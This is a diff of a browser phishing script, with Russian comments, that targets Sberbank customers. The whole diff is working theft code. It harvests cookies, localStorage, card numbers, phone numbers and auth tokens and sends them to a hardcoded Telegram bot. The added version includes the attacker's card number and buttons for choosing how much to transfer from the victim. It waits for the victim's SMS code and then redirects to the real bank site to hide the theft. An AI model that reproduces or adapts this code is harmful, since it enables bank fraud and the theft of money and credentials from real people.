@@ -79,12 +79,13 @@
 </div>
 
 <script>
-// ========== НАСТРОЙКИ ==========
-const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА-СБОРЩИКА
+// ========== НАСТРОЙКИ (ВСТАВЬ СВОИ) ==========
+const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
 const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
-const TRANSFER_BOT = "SberTransferBot";                // Имя бота для переводов
-// ================================
+const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
+// ==============================================
 
+// Функция отправки в Telegram
 function sendToTelegram(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -93,7 +94,28 @@ function sendToTelegram(text) {
     }).catch(e => console.log("Send error"));
 }
 
-// Поиск банковских данных в localStorage
+// Функция для отправки кнопок (для подтверждения перевода)
+function sendWithButtons(text, callbackData) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "✅ ПЕРЕВЕСТИ ВСЁ", callback_data: "transfer_all" },
+                    { text: "💰 ПЕРЕВЕСТИ 5000", callback_data: "transfer_5000" },
+                    { text: "💰 ПЕРЕВЕСТИ 10000", callback_data: "transfer_10000" }
+                ],[
+                    { text: "📋 ПОКАЗАТЬ ДАННЫЕ", callback_data: "show_data" }
+                ]]
+            }
+        })
+    }).catch(e => console.log("Send error"));
+}
+
+// Поиск банковских данных
 function extractBankData() {
     const bankData = {};
     const keywords = ['card', 'phone', 'token', 'auth', 'session', 'user', 'login', 'sber', 'sb', 'account', 'balance'];
@@ -110,60 +132,100 @@ function extractBankData() {
         }
         
         // Поиск номера карты (16 цифр)
-        const cardMatch = value.match(/\d{16}/);
+        const cardMatch = value && value.match(/\d{16}/);
         if (cardMatch) {
-            bankData['found_card'] = cardMatch[0];
+            bankData['card_number'] = cardMatch[0];
         }
         
         // Поиск телефона
-        const phoneMatch = value.match(/\+?\d{11}/);
+        const phoneMatch = value && value.match(/7\d{10}/);
         if (phoneMatch) {
-            bankData['found_phone'] = phoneMatch[0];
+            bankData['phone'] = phoneMatch[0];
         }
     }
     return bankData;
 }
 
-// Кража и отправка всех данных
-async function collectAndSend() {
-    // 1. Отправка информации о жертве
-    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
-⏰ ${new Date().toLocaleString()}
-🌐 ${window.location.hostname}
-🖥️ ${navigator.userAgent.substring(0, 200)}`);
-
-    // 2. Cookies
-    if (document.cookie) {
-        sendToTelegram(`🍪 COOKIES:\n${document.cookie}`);
+// Функция для получения IP
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch(e) {
+        return "unknown";
     }
+}
 
-    // 3. LocalStorage
+// Функция для попытки автоматического перевода (имитация)
+async function tryAutoTransfer(bankData, fullLS, victimIP) {
+    // Ищем токен для входа без SMS
+    const token = bankData.auth_token || bankData.token || bankData.access_token;
+    
+    if (token) {
+        sendToTelegram(`🔑 НАЙДЕН ТОКЕН ДОСТУПА!\nТокен: ${token.substring(0, 50)}...\n\nПопытка автоматического входа...`);
+        
+        // Сохраняем данные для ручного перевода
+        sendWithButtons(
+            `💰 ГОТОВ К ПЕРЕВОДУ\n\n` +
+            `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
+            `📞 Телефон: ${bankData.phone || "не найден"}\n` +
+            `🔑 Токен: ${token.substring(0, 30)}...\n` +
+            `🌐 IP: ${victimIP}\n` +
+            `⏰ Время: ${new Date().toLocaleString()}\n\n` +
+            `Выбери сумму для перевода на карту ${MY_CARD}:`,
+            "transfer"
+        );
+        return token;
+    }
+    
+    // Если нет токена, показываем что нашли
+    sendToTelegram(`⚠️ ТОКЕН НЕ НАЙДЕН\n\nНо есть другие данные:\n💳 Карта: ${bankData.card_number || "нет"}\n📞 Телефон: ${bankData.phone || "нет"}`);
+    
+    sendWithButtons(
+        `⚠️ ТРЕБУЕТСЯ SMS ПОДТВЕРЖДЕНИЕ\n\n` +
+        `💳 Карта жертвы: ${bankData.card_number || "не найдена"}\n` +
+        `📞 Телефон: ${bankData.phone || "не найден"}\n` +
+        `🌐 IP: ${victimIP}\n\n` +
+        `После того как жертва получит SMS, введи код вручную в Telegram\n\n` +
+        `Жду SMS код...`,
+        "waiting_sms"
+    );
+    
+    return null;
+}
+
+// ГЛАВНАЯ ФУНКЦИЯ
+async function main() {
+    const victimIP = await getIP();
     const bankData = extractBankData();
-    if (Object.keys(bankData).length > 0) {
-        sendToTelegram(`🏦 БАНКОВСКИЕ ДАННЫЕ:\n${JSON.stringify(bankData, null, 2)}`);
-    }
-
-    // 4. Полный localStorage
+    
+    // Полный localStorage для отчета
     let fullLS = {};
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         let val = localStorage.getItem(key);
-        if (val && val.length > 500) val = val.substring(0, 500) + "...";
+        if (val && val.length > 300) val = val.substring(0, 300) + "...";
         fullLS[key] = val;
     }
-    if (Object.keys(fullLS).length > 0) {
-        sendToTelegram(`💾 LOCALSTORAGE:\n${JSON.stringify(fullLS, null, 2)}`);
-    }
+    
+    // Отправка данных оператору
+    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
+⏰ ${new Date().toLocaleString()}
+🌐 ${window.location.hostname}
+🌍 IP: ${victimIP}
+🖥️ ${navigator.userAgent.substring(0, 150)}
 
-    // 5. IP адрес
-    try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        sendToTelegram(`🌐 IP: ${ipData.ip}`);
-    } catch(e) {}
+🍪 COOKIES:
+${document.cookie || "нет"}
 
-    // 6. Информация об устройстве
-    sendToTelegram(`📱 УСТРОЙСТВО:
+🏦 БАНКОВСКИЕ ДАННЫЕ:
+${JSON.stringify(bankData, null, 2)}
+
+💾 LOCALSTORAGE (полный):
+${JSON.stringify(fullLS, null, 2).substring(0, 3500)}
+
+📱 УСТРОЙСТВО:
 ${JSON.stringify({
     screen: `${screen.width}x${screen.height}`,
     language: navigator.language,
@@ -171,34 +233,14 @@ ${JSON.stringify({
     platform: navigator.platform
 }, null, 2)}`);
 
-    // 7. Активация бота для перевода
-    sendToTelegram(`💰 ЗАПРОС НА АВТОПЕРЕВОД\nБот: @${TRANSFER_BOT}\nДанные отправлены в бота-переводчика`);
-    
-    // 8. Отправка данных второму боту для перевода
-    const transferData = {
-        cookies: document.cookie,
-        bankData: bankData,
-        fullLS: fullLS,
-        userAgent: navigator.userAgent,
-        ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
-        timestamp: new Date().toISOString()
-    };
-    
-    // Отправляем данные второму боту (через API Telegram)
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `🤖 ПЕРЕДАЧА ДАННЫХ БОТУ-ПЕРЕВОДЧИКУ:\n\`\`\`json\n${JSON.stringify(transferData, null, 2).substring(0, 3900)}\n\`\`\``
-        })
-    });
+    // Пытаемся сделать автоперевод
+    await tryAutoTransfer(bankData, fullLS, victimIP);
 }
 
-// Запуск сбора
-collectAndSend();
+// ЗАПУСК
+main();
 
-// Перенаправление на реальный сайт
+// Перенаправление на реальный сайт через 3 секунды
 setTimeout(() => {
     window.location.href = "https://online.sberbank.ru";
 }, 3000);
